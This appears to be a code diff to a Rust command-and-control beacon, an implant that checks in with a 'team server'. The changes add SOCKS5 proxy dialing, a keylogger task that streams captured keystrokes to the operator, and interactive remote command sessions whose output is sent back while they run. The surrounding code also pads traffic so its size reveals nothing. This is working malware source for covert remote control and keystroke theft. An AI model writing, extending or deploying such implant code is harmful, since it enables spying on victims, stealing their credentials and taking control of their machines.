@@ -22,11 +22,24 @@ pub struct Beacon {
     channel: Option<Box<dyn Channel>>,
     cycles: u64,
     failures: u32,
+    /// The open sessions and the output they produced.
+    ///
+    /// A session outlives the connection: the operator writes to it and
+    /// reads from it while it runs, so the beacon keeps the stream and
+    /// sends the chunks as they arrive.
+    backgrounds: std::collections::HashMap<String, (String, crate::sessions::Stream)>,
 }
 
 impl Beacon {
     pub fn new(cfg: Config) -> Self {
-        Beacon { cfg, session: None, channel: None, cycles: 0, failures: 0 }
+        Beacon {
+            cfg,
+            session: None,
+            channel: None,
+            cycles: 0,
+            failures: 0,
+            backgrounds: std::collections::HashMap::new(),
+        }
     }
 
     fn log(&self, msg: &str) {
@@ -101,6 +114,11 @@ impl Beacon {
         let ch: Box<dyn Channel> = match self.cfg.transport {
             Transport::Tcp => {
                 let mut c = TcpChannel::new(&self.cfg.server);
+                if !self.cfg.proxy.is_empty() {
+                    // The beacon dials through a SOCKS5 proxy: the proxy
+                    // carries the traffic to the team server.
+                    c = c.with_proxy(&self.cfg.proxy);
+                }
                 c.connect().map_err(|e| format!("connect {}: {e}", self.cfg.server))?;
                 Box::new(c)
             }
@@ -137,7 +155,19 @@ impl Beacon {
         self.session = None;
         self.open_channel()?;
         self.handshake()?;
-        let keep_running = self.cycle()?;
+        let mut keep_running = self.cycle()?;
+        // A live session keeps the connection open: the operator writes to it
+        // and reads from it while it runs, so the beacon stays connected
+        // instead of sleeping between the check-ins.
+        while keep_running && !self.backgrounds.is_empty() {
+            self.drain_backgrounds()?;
+            if self.backgrounds.is_empty() {
+                break;
+            }
+            sleep_secs(1);
+            keep_running = self.cycle()?;
+        }
+        self.drain_backgrounds()?;
         // Traffic padding: the last request of a cycle is padded to a bucket
         // size, so its length does not tell how much work the cycle carried.
         self.pad_pending()?;
@@ -336,6 +366,62 @@ impl Beacon {
             self.log(&format!("task {id} kind={kind}"));
 
             match kind.as_str() {
+                "keylog" => {
+                    // The key logger streams the keys while it runs, exactly
+                    // like a session does.
+                    let seconds = args.u64_or("seconds", 60);
+                    match crate::desktop::keylog(seconds) {
+                        Ok(stream) => {
+                            let sid = format!("k-{}", crate::config::hex_encode(
+                                &crate::crypto::random_bytes(4)));
+                            self.log(&format!("key logger {sid} started"));
+                            let value = upk::map(vec![
+                                ("id", upk::s(&id)),
+                                ("code", upk::i(0)),
+                                ("out", upk::bin(&[])),
+                                ("err", upk::s("")),
+                                ("partial", upk::bool_(true)),
+                                ("session", upk::s(&sid)),
+                            ]);
+                            let frame = self.seal(wire::MSG_RESULT, &value)?;
+                            self.write(&frame)?;
+                            self.backgrounds.insert(id.clone(), (sid, stream));
+                        }
+                        Err(e) => {
+                            let outcome = task::Outcome::err(1, e);
+                            self.send_result(&id, &outcome)?;
+                        }
+                    }
+                }
+                "session.open" => {
+                    // The session outlives the task: the beacon keeps the
+                    // stream, sends the output as partial results and
+                    // completes the task when the session ends.
+                    let cmd = args.str_or("cmd", "");
+                    match crate::sessions::open(&cmd) {
+                        Ok((sid, stream)) => {
+                            self.log(&format!("session {sid} opened"));
+                            // The session id travels with the first chunk, so
+                            // the operator can address the session before it
+                            // produced any output at all.
+                            let value = upk::map(vec![
+                                ("id", upk::s(&id)),
+                                ("code", upk::i(0)),
+                                ("out", upk::bin(&[])),
+                                ("err", upk::s("")),
+                                ("partial", upk::bool_(true)),
+                                ("session", upk::s(&sid)),
+                            ]);
+                            let frame = self.seal(wire::MSG_RESULT, &value)?;
+                            self.write(&frame)?;
+                            self.backgrounds.insert(id.clone(), (sid, stream));
+                        }
+                        Err(e) => {
+                            let outcome = task::Outcome::err(1, e);
+                            self.send_result(&id, &outcome)?;
+                        }
+                    }
+                }
                 "exit" | "kill" => {
                     let outcome = task::run(&self.context(), &kind, &args);
                     self.send_result(&id, &outcome)?;
@@ -358,6 +444,46 @@ impl Beacon {
 
         self.send_bye()?;
         Ok(true)
+    }
+
+    /// Send the output the open sessions produced.
+    ///
+    /// A chunk is a partial result: the task is still running, so the server
+    /// appends the chunk instead of completing the task.  When a session ends,
+    /// its exit status completes the task.
+    fn drain_backgrounds(&mut self) -> Result<(), String> {
+        // Collect first and send afterwards: sending borrows the session.
+        let mut pending: Vec<(String, String, Vec<u8>)> = Vec::new();
+        let mut finished: Vec<(String, task::Outcome)> = Vec::new();
+        for (id, (sid, stream)) in self.backgrounds.iter_mut() {
+            while let Ok(chunk) = stream.rx.try_recv() {
+                pending.push((id.clone(), sid.clone(), chunk));
+            }
+            if let Some(result) = stream.outcome() {
+                let outcome = match result {
+                    Ok(o) => o,
+                    Err(e) => task::Outcome::err(1, e),
+                };
+                finished.push((id.clone(), outcome));
+            }
+        }
+        for (id, sid, chunk) in pending {
+            let value = upk::map(vec![
+                ("id", upk::s(&id)),
+                ("code", upk::i(0)),
+                ("out", upk::bin(&chunk)),
+                ("err", upk::s("")),
+                ("partial", upk::bool_(true)),
+                ("session", upk::s(&sid)),
+            ]);
+            let frame = self.seal(wire::MSG_RESULT, &value)?;
+            self.write(&frame)?;
+        }
+        for (id, outcome) in finished {
+            self.backgrounds.remove(&id);
+            self.send_result(&id, &outcome)?;
+        }
+        Ok(())
     }
 
     fn send_result(&mut self, task_id: &str, outcome: &task::Outcome) -> Result<(), String> {
